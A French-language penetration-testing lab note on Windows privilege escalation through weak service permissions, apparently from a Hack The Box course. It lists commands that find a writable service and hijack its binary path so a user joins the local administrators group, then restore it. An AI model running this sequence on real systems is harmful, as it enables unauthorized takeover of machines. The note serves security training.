# Weak Service Permissions

### <mark style="color:red;">Weak Service Permissions</mark>

#### <mark style="color:green;">Nouvel examen de SharpUp</mark>

```
C:\htb> SharpUp.exe audit
```

#### <mark style="color:green;">Vérification des permissions avec AccessChk</mark>

```
C:\htb> accesschk.exe /accepteula -quvcw WindscribeService
 
WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
```

#### <mark style="color:green;">Vérification du groupe administrateur local</mark>

La vérification du groupe des administrateurs locaux confirme que notre utilisateur htb-student n'en est pas membre.

```
C:\htb> net localgroup administrators
```

#### <mark style="color:green;">Modification du chemin binaire du service</mark>

{% code fullWidth="true" %}
```
C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

[SC] ChangeServiceConfig SUCCESS
```
{% endcode %}

#### <mark style="color:green;">Arrêt du service</mark>

```
C:\htb> sc stop WindscribeService
```

#### <mark style="color:green;">Démarrage du service</mark>

```
C:\htb> sc start WindscribeService
```

#### <mark style="color:green;">Confirmation de l'ajout au groupe administrateur local</mark>

```
C:\htb> net localgroup administrators
```

{% hint style="warning" %}
Un autre exemple notable est le service Windows Update Orchestrator (UsoSvc), qui est responsable du téléchargement et de l'installation des mises à jour du système d'exploitation. Il est considéré comme un service Windows essentiel et ne peut pas être supprimé. Comme il est responsable d'apporter des modifications au système d'exploitation par l'installation de mises à jour de sécurité et de fonctionnalités, il s'exécute en tant que compte tout-puissant NT AUTHORITY\SYSTEM. Avant l'installation du correctif de sécurité relatif à CVE-2019-1322, il était possible d'élever les privilèges d'un compte de service à SYSTEM. Cela était dû à des permissions faibles, qui permettaient aux comptes de service de modifier le chemin binaire du service et de démarrer/arrêter le service.
{% endhint %}

***

### <mark style="color:red;">Weak Service Permissions - Cleanup</mark>

#### <mark style="color:green;">Réversion du chemin binaire</mark>

{% code fullWidth="true" %}
```
C:\htb> sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"

[SC] ChangeServiceConfig SUCCESS
```
{% endcode %}

#### <mark style="color:green;">Redémarrage du service</mark>

```
C:\htb> sc start WindScribeService
```

#### <mark style="color:green;">Vérification que le service fonctionne</mark>

```
C:\htb> sc query WindScribeService
```
